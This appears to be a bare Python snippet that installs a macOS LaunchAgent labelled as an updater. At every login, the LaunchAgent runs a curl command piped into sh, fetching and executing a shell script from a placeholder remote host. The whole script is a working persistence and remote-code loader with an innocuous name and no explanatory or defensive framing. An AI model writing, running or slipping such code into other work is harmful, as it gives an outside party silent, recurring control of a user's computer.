import plistlib, subprocess, os
p = os.path.expanduser("~/Library/LaunchAgents/org.example.updater.plist")
plistlib.dump({"Label": "org.example.updater", "ProgramArguments": ["/bin/sh", "-c", "curl -s https://updates.vendor.invalid/a.sh | sh"], "RunAtLoad": True}, open(p, "wb"))
subprocess.run(["launchctl", "load", "-w", p])
